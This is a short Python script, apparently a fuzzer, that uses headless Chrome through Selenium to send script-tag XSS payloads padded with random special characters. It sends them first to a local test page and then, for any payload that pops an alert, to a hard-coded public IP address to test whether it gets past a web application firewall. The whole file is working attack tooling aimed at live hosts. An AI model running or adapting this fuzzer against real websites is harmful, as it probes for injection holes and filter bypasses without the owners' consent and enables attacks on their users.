# coding: utf-8
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time,random
class test_waf:
    def __init__(self):
        self.chrome_options = Options()
        self.chrome_options.add_argument('--headless')
        self.chrome_options.binary_location = r'%s'%"E:/software/chrome-win/chrome.exe"
    def test_waf(self,test_param):
            try:
                test_url='http://111.231.117.191/cc023414493d245c7080df0ba4f52b51/xss1.php?output=%s'%test_param
                print(test_url)
                driver = webdriver.Chrome(executable_path="G:/Code/Library/chromedriver.exe",options=self.chrome_options)
                driver.get(test_url)
                time.sleep(2)
                obj = driver.switch_to.alert
                if obj:
                    print ('[#] '+test_url)
            except Exception as e:
                print(e)
            finally:
                driver.quit()
    def run(self):
        while 1:
            try:
                str_random=''.join(random.sample(['a','b','@','A','.',',','\'','"','%0A','%','%2B','(',')','`','\\','//','c',
                                                  'd','e','[',']','|','-','$','}','{',';','?','!','~','!',
                                                 'f', 'g','h','i','j'], 15))
                test_param='%3Cscript%3Ealert("'+str_random+'")%3C/script%3E'
                test_url='http://192.168.0.137/xsstest.php?xss=%s'%test_param
                print(test_url)
                driver = webdriver.Chrome(executable_path="G:/Code/Library/chromedriver.exe",options=self.chrome_options)
                driver.get(test_url)
                time.sleep(3)
                obj = driver.switch_to.alert
                if obj:
                    #print ('[#] '+test_url)
                    print(1111)
                    self.test_waf(test_param)
            except:
                driver.quit()
                continue
            finally:
                driver.quit()
if __name__ == "__main__":
    p1=test_waf()
    p1.run()